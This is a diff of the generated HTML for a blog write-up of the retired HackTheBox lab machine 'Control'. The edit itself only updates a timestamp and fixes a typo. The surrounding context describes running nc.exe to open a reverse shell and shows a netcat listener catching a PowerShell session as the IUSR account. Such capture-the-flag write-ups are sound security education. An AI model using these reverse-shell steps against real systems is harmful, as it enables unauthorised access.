@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://ph-payas0.github.io/img/control/control-netcat-connect.png">
 <meta property="og:image" content="https://www.hackthebox.eu/badge/image/128965">
 <meta property="article:published_time" content="2020-04-26T11:06:52.000Z">
-<meta property="article:modified_time" content="2020-04-27T00:56:49.429Z">
+<meta property="article:modified_time" content="2020-04-27T02:03:35.742Z">
 <meta property="article:author" content="medz">
 <meta property="article:tag" content="windows">
 <meta property="article:tag" content="retired">
@@ -312,7 +312,7 @@
 <p><img src="/img/control/control-nc-exe.png" alt="HackTheBox-Control" title="Control IUSR"></p>
 <p>Now i execute <code>nc.exe</code> with my <strong>IP</strong> and <strong>Port</strong> and setup a <code>netcat</code> lister in my host.</p>
 <p><img src="/img/control/control-netcat-connect.png" alt="HackTheBox-Control" title="Control IUSR"></p>
-<p>Finally I have not the initial shell.</p>
+<p>Finally I have now the initial shell.</p>
 <figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Control via 🐘 v7<span class="number">.3</span><span class="number">.15</span> </span><br><span class="line">❯ nc -nlvp <span class="number">9001</span></span><br><span class="line">listening <span class="keyword">on</span> [any] <span class="number">9001</span> ...</span><br><span class="line">connect to [<span class="number">10.10</span><span class="number">.15</span><span class="number">.102</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">10.10</span><span class="number">.10</span><span class="number">.167</span>] <span class="number">53096</span></span><br><span class="line">Windows PowerShell </span><br><span class="line">Copyright (C) Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">PS C:\payas0&gt; whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\iusr</span><br><span class="line">PS C:\payas0&gt; hostname</span><br><span class="line">hostname</span><br><span class="line">Fidelity</span><br><span class="line">PS C:\payas0&gt;</span><br></pre></td></tr></table></figure>
 
 <p>the user flag is currently not accessible for the user I have. I’ll try first to enumerate the file directory in <code>/inetpub/wwwroot</code></p>
